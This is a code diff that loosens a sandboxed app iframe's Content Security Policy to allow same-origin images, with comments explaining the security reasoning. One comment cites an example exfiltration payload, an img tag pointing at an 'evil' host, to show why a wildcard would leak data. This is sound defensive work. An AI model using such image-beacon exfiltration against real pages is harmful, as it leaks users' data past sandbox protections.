@@ -170,8 +170,13 @@ function buildSrcDoc(
   const { markup: styleMarkup, styleHrefs } = hostStyleMarkup();
   // CSP: the app may only render — NO network of its own. `connect-src 'none'`
   // blocks fetch/XHR/WebSocket, but img/font loads are network too, so they're
-  // held to inline sources only (data:/blob:) — a wildcard there would be an
-  // exfil channel (`<img src="https://evil/?d=…">`) despite connect-src 'none'.
+  // held to inline sources (data:/blob:) plus the HOST ORIGIN only — a wildcard
+  // would be an exfil channel (`<img src="https://evil/?d=…">`) despite
+  // connect-src 'none'. Same-origin images are deliberately allowed (Mantle is
+  // single-tenant; a request to our own server leaks nothing) so apps can show
+  // brain images and share attachments (`/s/<token>/a/<fileId>`). Note the
+  // opaque origin sends no cookies, so session-authed image routes still 401 —
+  // token-authed share paths are the ones that actually resolve.
   // The app's only egress is the postMessage bridge to the parent, which
   // brokers tool + sqlite calls server-side. Inline style + script are ours.
   //
@@ -209,7 +214,7 @@ function buildSrcDoc(
   const csp =
     `default-src 'none'; style-src 'unsafe-inline' ${styleSrc}; ` +
     `script-src 'unsafe-inline' ${origin}/app-runtime/; ` +
-    `img-src data: blob:; font-src data: ${styleSrc} ${origin}/fonts/; ` +
+    `img-src data: blob: ${origin}; font-src data: ${styleSrc} ${origin}/fonts/; ` +
     "connect-src 'none'; base-uri 'none'; form-action 'none'";
   return `<!doctype html>
 <html class="${cls}"${colorTheme}>
